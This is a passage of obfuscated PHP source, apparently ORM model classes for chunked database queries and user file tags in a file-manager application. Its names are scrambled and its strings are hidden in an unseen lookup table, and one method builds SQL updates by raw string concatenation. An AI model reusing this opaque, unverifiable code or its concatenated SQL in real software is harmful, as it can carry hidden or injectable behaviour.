"\125\x50\x44\101\124\x45\x20\x60{$¬¬ù¨‰¢}\x60\40\x53\x45\124\x20{$½‰äÜŠÕ[2]}\40\x3d\40\x43\101\x53\105\x20{$½‰äÜŠÕ[0]}\x20\12"; if ($áú¼ê×Á == 0) { $ª¾øİäÕ = $ ³ÅÛ­›; } $®µ³®ä´[] = $ÕÚÓø¥Ú[128] . $½‰äÜŠÕ[1] . $ÕÚÓø¥Ú[128]; $áú¼ê×Á++; $ª¾øİäÕ .= "\40\x57\110\x45\x4e\x20\47{$½‰äÜŠÕ[1]}\47\40\124\x48\x45\116\x20\x27{$½‰äÜŠÕ[3]}\x27\x20\xa"; if ($áú¼ê×Á == $¹šï¶½— || $ÃÕ¶¤Ä¯ == $À¶ÍÄ‰ - 1) { $àËüÜ’¢ = implode($ÕÚÓø¥Ú[60], $®µ³®ä´); $ª¾øİäÕ .= "\x20\x45\116\104\40\x20\127\x48\105\x52\105\x20{$½‰äÜŠÕ[0]}\40\111\x4e\40\50{$àËüÜ’¢}\51\40"; $this->execute($ª¾øİäÕ); $áú¼ê×Á = 0; $ª¾øİäÕ = $ ³ÅÛ­›; $this->chunkEventCheck(count($®µ³®ä´)); $®µ³®ä´ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÕÎ´ç“€) { $´Õ­‡ =& $_SERVER[¹Û¹Æ€]; $­ø¼Àøì = $this->tablePrefix . $this->tableName; foreach ($ÕÎ´ç“€ as $¾¨ğ‘ÒÕ) { if (!is_array($¾¨ğ‘ÒÕ) || count($¾¨ğ‘ÒÕ) != 4) { continue; } $äï‡©Øé = $¾¨ğ‘ÒÕ[0] . $´Õ­‡[388] . $¾¨ğ‘ÒÕ[1] . $´Õ­‡[128]; $úÑ¥×·‡ = $¾¨ğ‘ÒÕ[2] . $´Õ­‡[388] . $¾¨ğ‘ÒÕ[3] . $´Õ­‡[128]; $ğ¦ÀÂ© = "\165\160\x64\x61\164\145\x20{$­ø¼Àøì}\x20\163\x65\164\x20{$úÑ¥×·‡}\x20\167\150\x65\162\x65\40{$äï‡©Øé}\73"; $this->execute($ğ¦ÀÂ©); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¯‹«Æ•¿ = false, $¨¥¡Áàı = false) { $this->_chunkEvent = $¯‹«Æ•¿; $this->_chunkEventParam = $¨¥¡Áàı; } private function chunkEventCheck($Úñ€»ß) { if (!$this->_chunkEvent) { return; } $¡ ¬–ë¨ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¡ ¬–ë¨[$_SERVER[¹Û¹Æ€][389]] = $Úñ€»ß; Hook::trigger($this->_chunkEvent, $¡ ¬–ë¨); } public function addAll($î†³¼áÂ, $‘üÅı¯ì = array(), $Ê¾£ß©¯ = false) { $ÂšèˆóØ =& $_SERVER[¹Û¹Æ€]; ignore_timeout(); $ÜÁŒÜ¾ = self::SQL_WHERE_IN_CHUNK; if (empty($î†³¼áÂ)) { $this->error = think_lang($ÂšèˆóØ[280]); return !1; } $‘üÅı¯ì = $this->_parseOptions($‘üÅı¯ì); foreach ($î†³¼áÂ as $×Ğ¹ÀÍŠ => $£ßÒÏ) { $î†³¼áÂ[$×Ğ¹ÀÍŠ] = $this->_facade($£ßÒÏ); $this->_beforeInsert($î†³¼áÂ[$×Ğ¹ÀÍŠ], $‘üÅı¯ì); } if (method_exists($this->db, $ÂšèˆóØ[281])) { for ($À“ó›¡ = 0; $À“ó›¡ < count($î†³¼áÂ); $À“ó›¡ += $ÜÁŒÜ¾) { $¶ÆºÖÀÀ = array_slice($î†³¼áÂ, $À“ó›¡, $ÜÁŒÜ¾); if (!is_array($¶ÆºÖÀÀ) || count($¶ÆºÖÀÀ) == 0) { break; } $“Î×ºÓ = $this->db->insertAll($¶ÆºÖÀÀ, $‘üÅı¯ì, $Ê¾£ß©¯); $this->chunkEventCheck(count($¶ÆºÖÀÀ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($î†³¼áÂ as $×Ğ¹ÀÍŠ => $£ßÒÏ) { $“Î×ºÓ = $this->db->insert($£ßÒÏ, $‘üÅı¯ì, $Ê¾£ß©¯); } $this->commit(); } if (!1 !== $“Î×ºÓ) { $ØÂå²ìö = $this->getLastInsID(); if ($ØÂå²ìö) { return $ØÂå²ìö; } } return $“Î×ºÓ; } public function save($ç‘ÍœÙ† = '', $Á¯Šœ = array()) { $•´Áøü¢ =& $_SERVER[¹Û¹Æ€]; $‹ÛêÃ¶ê = self::SQL_WHERE_IN_CHUNK; $µ¨µªù‚ = $this->optionsValue(); $îƒ•à¿Í = $this->findWhereField($µ¨µªù‚); if (!$îƒ•à¿Í) { return parent::save($ç‘ÍœÙ†, $Á¯Šœ); } $¯«¥³Ú‚ = 0; $Ïªü‹áİ = $µ¨µªù‚[$•´Áøü¢[284]][$îƒ•à¿Í][1]; $Ïªü‹áİ = is_array($Ïªü‹áİ) ? $Ïªü‹áİ : array(); $šãùÎåù = count($Ïªü‹áİ); for ($¬â¢µ = 0; $¬â¢µ < $šãùÎåù; $¬â¢µ += $‹ÛêÃ¶ê) { $«“Àª‡ = array_slice($Ïªü‹áİ, $¬â¢µ, $‹ÛêÃ¶ê); if (!is_array($«“Àª‡) || count($«“Àª‡) == 0) { break; } $µ¨µªù‚[$•´Áøü¢[284]][$îƒ•à¿Í][1] = $«“Àª‡; $this->optionsValue($µ¨µªù‚); $¯«¥³Ú‚ += parent::save($ç‘ÍœÙ†, $Á¯Šœ); $this->chunkEventCheck(count($«“Àª‡)); } $this->chunkEventSet(); return $¯«¥³Ú‚; } public function add($ÓÕ³àæË = '', $Çõ’”‘ğ = array(), $ú§³Ù—å = false) { if ($this->addTaskStatus && is_array($ÓÕ³àæË)) { $this->addTaskData[] = $ÓÕ³àæË; return; } return parent::add($ÓÕ³àæË, $Çõ’”‘ğ, $ú§³Ù—å); } public function parseWhereLike($ßıƒ–á¢, $”µú˜íÛ = '', $Ÿìô˜Çƒ = false, &$‚É÷Œ¸ = false) { $–‹Şœ¹Ù =& $_SERVER[¹Û¹Æ€]; $å¡•ÁË = $GLOBALS[$–‹Şœ¹Ù[16]][$–‹Şœ¹Ù[390]]; if (!$å¡•ÁË[$–‹Şœ¹Ù[391]]) { return $ßıƒ–á¢; } if (!is_array($ßıƒ–á¢)) { return $ßıƒ–á¢; } $ñÁéÍ‘Ú = array(); $úÛ¸ÂÉÊ = 0; foreach ($ßıƒ–á¢ as $ª—ÜÑöé => $Š§ŸÓ†) { if (is_array($Š§ŸÓ†) && count($Š§ŸÓ†) == 2 && $Š§ŸÓ†[0] == $–‹Şœ¹Ù[392] && is_string($Š§ŸÓ†[1]) && substr($Š§ŸÓ†[1], 0, 1) == $–‹Şœ¹Ù[393] && substr($Š§ŸÓ†[1], strlen($Š§ŸÓ†[1]) - 1, 1) == $–‹Şœ¹Ù[393]) { $‚É÷Œ¸ = !0; $…ÎÛ­ = is_string($ª—ÜÑöé) ? $ª—ÜÑöé : $”µú˜íÛ; $Å°Í±Ôô = substr($Š§ŸÓ†[1], 1, strlen($Š§ŸÓ†[1]) - 2); $Å°Í±Ôô = $this->db->escapeString($Å°Í±Ôô); if (!strpos($…ÎÛ­, $–‹Şœ¹Ù[20])) { $…ÎÛ­ = $–‹Şœ¹Ù[394] . $…ÎÛ­ . $–‹Şœ¹Ù[394]; } $ë¿Œù = $–‹Şœ¹Ù[198] . $Å°Í±Ôô . $–‹Şœ¹Ù[198]; $Å°Í±Ôô = str_replace(array($–‹Şœ¹Ù[20], $–‹Şœ¹Ù[395], $–‹Şœ¹Ù[21]), $–‹Şœ¹Ù[396], $Å°Í±Ôô); if ($å¡•ÁË[$–‹Şœ¹Ù[397]]) { $ë¿Œù = $–‹Şœ¹Ù[398] . $Å°Í±Ôô . $–‹Şœ¹Ù[399]; if ($å¡•ÁË[$–‹Şœ¹Ù[400]]) { $ë¿Œù = $–‹Şœ¹Ù[399] . $Å°Í±Ôô . $–‹Şœ¹Ù[398]; } } $ñÁéÍ‘Ú[$úÛ¸ÂÉÊ] = $–‹Şœ¹Ù[401] . $…ÎÛ­ . $–‹Şœ¹Ù[402] . $ë¿Œù . $–‹Şœ¹Ù[403]; $úÛ¸ÂÉÊ++; continue; } if (is_array($Š§ŸÓ†)) { $”µú˜íÛ = is_string($ª—ÜÑöé) ? $ª—ÜÑöé : $”µú˜íÛ; $Š§ŸÓ† = $this->parseWhereLike($Š§ŸÓ†, $”µú˜íÛ, !0, $‚É÷Œ¸); } if (is_numeric($ª—ÜÑöé)) { $ñÁéÍ‘Ú[$úÛ¸ÂÉÊ] = $Š§ŸÓ†; $úÛ¸ÂÉÊ++; } else { $ñÁéÍ‘Ú[$ª—ÜÑöé] = $Š§ŸÓ†; } } if ($‚É÷Œ¸ && !$Ÿìô˜Çƒ) { } return $ñÁéÍ‘Ú; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÁşÈ–†ê = array()) { $»³Ö”ÙÈ =& $_SERVER[¹Û¹Æ€]; $ş’ıÃÉÇ = self::SQL_WHERE_IN_CHUNK; $„î‡®÷Ï = $this->optionsValue(); $´İóûª = $this->findWhereField($„î‡®÷Ï); if (!$´İóûª || isset($„î‡®÷Ï[$»³Ö”ÙÈ[301]]) || isset($„î‡®÷Ï[$»³Ö”ÙÈ[362]])) { return parent::select($ÁşÈ–†ê); } $„‰òÖ÷Ä = $„î‡®÷Ï[$»³Ö”ÙÈ[284]][$´İóûª][1]; $„‰òÖ÷Ä = is_array($„‰òÖ÷Ä) ? $„‰òÖ÷Ä : array(); $Îü÷¬© = null; for ($©¢Ì¢§ = 0; $©¢Ì¢§ < count($„‰òÖ÷Ä); $©¢Ì¢§ += $ş’ıÃÉÇ) { $¯Ğì¹ · = array_slice($„‰òÖ÷Ä, $©¢Ì¢§, $ş’ıÃÉÇ); if (!is_array($¯Ğì¹ ·) || count($¯Ğì¹ ·) == 0) { break; } $„î‡®÷Ï[$»³Ö”ÙÈ[284]][$´İóûª][1] = $¯Ğì¹ ·; $this->optionsValue($„î‡®÷Ï); $Àƒ†ˆ¹Ö = parent::select($ÁşÈ–†ê); if (!$Àƒ†ˆ¹Ö) { continue; } $Îü÷¬© = is_array($Îü÷¬©) ? $Îü÷¬© : array(); $Îü÷¬© = array_merge($Îü÷¬©, $Àƒ†ˆ¹Ö); } return $Îü÷¬©; } public function delete($÷‚Ù­Æ„ = array()) { $åÎ¼‚ë¡ =& $_SERVER[¹Û¹Æ€]; $ßÍËÙş = self::SQL_WHERE_IN_CHUNK; $ìî éÇŸ = $this->optionsValue(); $ôàñ­–Ö = $this->findWhereField($ìî éÇŸ); if (!$ôàñ­–Ö) { return parent::delete($÷‚Ù­Æ„); } $ãØæòâ· = 0; $Ç…À½º = $ìî éÇŸ[$åÎ¼‚ë¡[284]][$ôàñ­–Ö][1]; $Ç…À½º = is_array($Ç…À½º) ? $Ç…À½º : array(); for ($“—Şñ«Ø = 0; $“—Şñ«Ø < count($Ç…À½º); $“—Şñ«Ø += $ßÍËÙş) { $÷ÏûÉÍ = array_slice($Ç…À½º, $“—Şñ«Ø, $ßÍËÙş); if (!is_array($÷ÏûÉÍ) || count($÷ÏûÉÍ) == 0) { break; } $ìî éÇŸ[$åÎ¼‚ë¡[284]][$ôàñ­–Ö][1] = $÷ÏûÉÍ; $this->optionsValue($ìî éÇŸ); $ãØæòâ· += parent::delete($÷‚Ù­Æ„); } return $ãØæòâ·; } private function findWhereField($–†üû‹â) { $‘ƒ×„íò =& $_SERVER[¹Û¹Æ€]; $íÅ™Çşã = self::SQL_WHERE_IN_CHUNK; if (!is_array($–†üû‹â) || !is_array($–†üû‹â[$‘ƒ×„íò[284]])) { return !1; } foreach ($–†üû‹â[$‘ƒ×„íò[284]] as $àÛö¢Š¥ => $§ûÍûº) { if (is_array($§ûÍûº) && isset($§ûÍûº[0]) && is_string($§ûÍûº[0]) && strtolower($§ûÍûº[0]) == $‘ƒ×„íò[17] && is_array($§ûÍûº[1]) && count($§ûÍûº[1]) > $íÅ™Çşã) { ignore_timeout(); return $àÛö¢Š¥; } } return !1; } public function setMasterDB($»ÄØ÷Ì® = true) { think_config($_SERVER[¹Û¹Æ€][404], $»ÄØ÷Ì®); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\x6d\x4f\x70\164\151\157\156"; public $field = array(); public function listData($ğ™÷èñè = false, $õ˜à¼ÎÂ = "\x6d\157\144\x69\x66\x79\124\x69\155\x65", $° ­ƒ™ = false) { $ÀêÚçíè = Model($this->modelType)->get(!1, $this->optionType, !0); $÷…¥ïš = array_values($ÀêÚçíè); if ($÷…¥ïš && $÷…¥ïš[0] && !is_array($÷…¥ïš[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÀêÚçíè = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÀêÚçíè) { return $ğ™÷èñè ? null : array(); } if (!$ğ™÷èñè) { $ÀêÚçíè = array_filter(array_values($ÀêÚçíè)); return array_sort_by($ÀêÚçíè, $õ˜à¼ÎÂ, $° ­ƒ™); } return $ÀêÚçíè[$_SERVER[¹Û¹Æ€][405] . $ğ™÷èñè]; } public function insert($ÉáÖ×–) { $ª¬±£Ò¶ =& $_SERVER[¹Û¹Æ€]; $ÉáÖ×– = array_field_key($ÉáÖ×–, $this->field); $åßäïä¬ = Model($this->modelType)->get($ª¬±£Ò¶[406], $this->optionType . $ª¬±£Ò¶[407]); $åßäïä¬ = $åßäïä¬ ? $åßäïä¬ : 0; $ÉáÖ×–[$ª¬±£Ò¶[408]] = ++$åßäïä¬; $ÉáÖ×–[$ª¬±£Ò¶[210]] = time(); $ÉáÖ×–[$ª¬±£Ò¶[95]] = time(); Model($this->modelType)->set($ª¬±£Ò¶[406], $åßäïä¬, $this->optionType . $ª¬±£Ò¶[407]); Model($this->modelType)->set($ª¬±£Ò¶[405] . $åßäïä¬, $ÉáÖ×–, $this->optionType); return $åßäïä¬; } public function update($®¤‘“‹Ï, $àˆ„ı‘¶) { $ÉœÁï²÷ =& $_SERVER[¹Û¹Æ€]; $àˆ„ı‘¶ = array_field_key($àˆ„ı‘¶, $this->field); $ùÙŒÓß = $this->listData($®¤‘“‹Ï); if (!$ùÙŒÓß || !$®¤‘“‹Ï) { return !1; } $àˆ„ı‘¶ = array_merge($ùÙŒÓß, $àˆ„ı‘¶); $àˆ„ı‘¶[$ÉœÁï²÷[95]] = time(); return Model($this->modelType)->set($ÉœÁï²÷[405] . $®¤‘“‹Ï, $àˆ„ı‘¶, $this->optionType); } public function remove($Ñ°Ø—ì) { if (!$Ñ°Ø—ì) { return !1; } return Model($this->modelType)->remove($_SERVER[¹Û¹Æ€][405] . $Ñ°Ø—ì, $this->optionType); } public function clear() { $ÚÚæÈ¸ =& $_SERVER[¹Û¹Æ€]; Model($this->modelType)->remove($ÚÚæÈ¸[406], $this->optionType . $ÚÚæÈ¸[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($æ¤»ìíĞ, $³Şä˜ï) { if (!$³Şä˜ï) { return !1; } $£‘Ô»Ó = $this->listData(); $£‘Ô»Ó = array_to_keyvalue($£‘Ô»Ó, $æ¤»ìíĞ); return isset($£‘Ô»Ó[$³Şä˜ï]) ? $£‘Ô»Ó[$³Şä˜ï] : !1; } public function findByName($Ã¢ÖÌ) { return $this->findByKey($_SERVER[¹Û¹Æ€][42], $Ã¢ÖÌ); } protected function resetData($ô”—´—ù) { $¤ÜÁ™ú¡ =& $_SERVER[¹Û¹Æ€]; $ô”—´—ù = is_array($ô”—´—ù) ? $ô”—´—ù : array(); $ÙéîÁÉû = array(); for ($îÑ¶„Ââ = 0; $îÑ¶„Ââ < count($ô”—´—ù); $îÑ¶„Ââ++) { $ÙéîÁÉû[$¤ÜÁ™ú¡[405] . $ô”—´—ù[$îÑ¶„Ââ][$¤ÜÁ™ú¡[408]]] = $ô”—´—ù[$îÑ¶„Ââ]; } return Model($this->modelType)->set($ÙéîÁÉû, !1, $this->optionType); } private function getAutoName($î†ÙÕÀ‡) { $Å‡Ø™Ëç = array_to_keyvalue($this->listData(), $_SERVER[¹Û¹Æ€][42]); if (!$Å‡Ø™Ëç || !isset($Å‡Ø™Ëç[$î†ÙÕÀ‡])) { return $î†ÙÕÀ‡; } for ($äô‰£Œ« = 1; $äô‰£Œ« < count($Å‡Ø™Ëç); $äô‰£Œ«++) { $í¼ÂÖùÜ = $î†ÙÕÀ‡ . "\50{$äô‰£Œ«}\x29"; if (!isset($Å‡Ø™Ëç[$í¼ÂÖùÜ])) { return $í¼ÂÖùÜ; } } return $í¼ÂÖùÜ; } } goto dÎ‚‡¿Ñéµ; cØÀíÜŞ¶Ï: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($ˆ“¿“Ñã) { $û¡îÚ¦Ó =& $_SERVER[¹Û¹Æ€]; return array($û¡îÚ¦Ó[1960] => array($û¡îÚ¦Ó[2339] . USER_ID, $û¡îÚ¦Ó[1961])); } protected function listData() { $ªÕØ¾¹ =& $_SERVER[¹Û¹Æ€]; $–İÌ‰º = array($ªÕØ¾¹[1650] => USER_ID, $ªÕØ¾¹[493] => array($ªÕØ¾¹[1964], 0)); $ ‹ŞìåÀ = $ªÕØ¾¹[2340]; $ëùê²ÓÂ = $this->field($ ‹ŞìåÀ)->where($–İÌ‰º)->order($ªÕØ¾¹[1967])->select(); return $ëùê²ÓÂ ? $ëùê²ÓÂ : array(); } protected function addToTag($ËÇ×òÓó, $ÙÃ™§³) { $ÙÜ”‘ğ… =& $_SERVER[¹Û¹Æ€]; if (!Model($ÙÜ”‘ğ…[2104])->listData($ÙÃ™§³)) { return !1; } if (is_numeric($ËÇ×òÓó)) { $Ù£ÚÓ»ç = Model($ÙÜ”‘ğ…[823])->pathInfo($ËÇ×òÓó); if (!$Ù£ÚÓ»ç) { return !1; } } else { $Ù£ÚÓ»ç = IO::infoSimple($ËÇ×òÓó); if (!$Ù£ÚÓ»ç) { return !1; } $éÛ¤É÷× = $Ù£ÚÓ»ç[$ÙÜ”‘ğ…[42]]; $Š“›ùŞ = $Ù£ÚÓ»ç[$ÙÜ”‘ğ…[43]]; if (isset($Ù£ÚÓ»ç[$ÙÜ”‘ğ…[419]])) { $Š“›ùŞ = $Ù£ÚÓ»ç[$ÙÜ”‘ğ…[419]] == $ÙÜ”‘ğ…[98] ? $ÙÜ”‘ğ…[85] : $ÙÜ”‘ğ…[209]; } } $Ñ˜ıÇµ = array($ÙÜ”‘ğ…[1650] => USER_ID, $ÙÜ”‘ğ…[493] => $ÙÃ™§³, $ÙÜ”‘ğ…[430] => $ËÇ×òÓó, $ÙÜ”‘ğ…[431] => $Š“›ùŞ ? $Š“›ùŞ : $ÙÜ”‘ğ…[425], $ÙÜ”‘ğ…[429] => $éÛ¤É÷× ? $éÛ¤É÷× : $ÙÜ”‘ğ…[22], $ÙÜ”‘ğ…[1853] => 0); if ($this->where($Ñ˜ıÇµ)->find()) { return !1; } return $this->add($Ñ˜ıÇµ); } protected function removeFromTag($ôüöÚÃ, $ü¿ñŞØØ) { $Ë«»®ç =& $_SERVER[¹Û¹Æ€]; if (!Model($Ë«»®ç[2104])->listData($ü¿ñŞØØ)) { return !1; } if (is_array($ôüöÚÃ)) { $ôüöÚÃ = array($Ë«»®ç[17], $ôüöÚÃ); } $™›õô½ = array($Ë«»®ç[1650] => USER_ID, $Ë«»®ç[493] => $ü¿ñŞØØ, $Ë«»®ç[430] => $ôüöÚÃ); return $this->where($™›õô½)->delete(); } protected function removeByTag($ã¶›òİŞ) { $º«½¹– =& $_SERVER[¹Û¹Æ€]; if (!$ã¶›òİŞ) { return !1; } $íŸÑ¥¬¡ = array($º«½¹–[1650] => USER_ID, $º«½¹–[493] => $ã¶›òİŞ); return $this->where($íŸÑ¥¬¡)->delete(); } protected function removeBySource($Œ‘†ÓùÇ) { $İöÉ™è¾ =& $_SERVER[¹Û¹Æ€]; if (is_array($Œ‘†ÓùÇ)) { $Œ‘†ÓùÇ = array($İöÉ™è¾[17], $Œ‘†ÓùÇ); } $Ï³şÍä = array($İöÉ™è¾[1650] => USER_ID, $İöÉ™è¾[493] => array($İöÉ™è¾[1011], 0), $İöÉ™è¾[430] => $Œ‘†ÓùÇ); return $this->where($Ï³şÍä)->delete(); } }